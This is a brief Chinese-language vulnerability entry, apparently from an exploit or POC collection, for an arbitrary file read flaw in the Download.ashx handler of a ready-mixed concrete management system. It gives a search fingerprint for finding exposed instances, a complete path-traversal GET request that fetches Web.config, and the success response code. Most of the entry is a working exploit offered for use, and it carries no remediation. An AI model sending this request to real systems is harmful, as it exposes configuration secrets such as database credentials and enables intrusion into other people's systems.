# 预拌砼综合管理系统Download.ashx存在任意文件读取漏洞

预拌砼综合管理系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="Libs/Platform.lib"`
- **请求**：`GET /WebUpload/Download.ashx?fname=1.txt&path=/../Web.config HTTP/1.1`
- **响应特征**：200